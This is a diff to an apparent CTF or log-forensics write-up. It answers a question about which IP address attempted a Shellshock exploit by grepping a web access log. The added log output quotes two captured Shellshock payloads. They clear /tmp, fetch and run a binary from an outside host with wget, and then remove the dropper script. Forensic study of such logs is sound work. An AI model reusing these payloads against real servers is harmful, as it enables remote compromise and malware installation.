@@ -71,7 +71,25 @@ Q6 - 10 points
 
 Which IP address attempted to exploit the shellshock vulnerability?
 
-- Research shellshock vulnerability and see it uses U
+- Research shellshock vulnerability and see it is a bug in Unix Bash shell
+
+![](attachments/Pasted%20image%2020250409215620.png)
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat access.log | grep -i "shellshock"
+  
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat access.log | grep -i "shell"     
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat access.log | grep -i "bash" 
+61.161.130.241 - - [30/Sep/2015:10:34:00 -0400] "GET / HTTP/1.1" 200 867 "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-ionw >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-ionw >> /tmp/Run.sh;echo /tmp/China.Z-ionw >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-ionw >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-ionw >> /tmp/Run.sh;echo /tmp/China.Z-ionw >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22"
+61.161.130.241 - - [30/Sep/2015:10:36:01 -0400] "GET / HTTP/1.1" 200 867 "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-fiuz >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-fiuz >> /tmp/Run.sh;echo /tmp/China.Z-fiuz >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-fiuz >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-fiuz >> /tmp/Run.sh;echo /tmp/China.Z-fiuz >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22"
+
+```
+
+`61.161.130.241`
 
 Q7 - 10 points
 
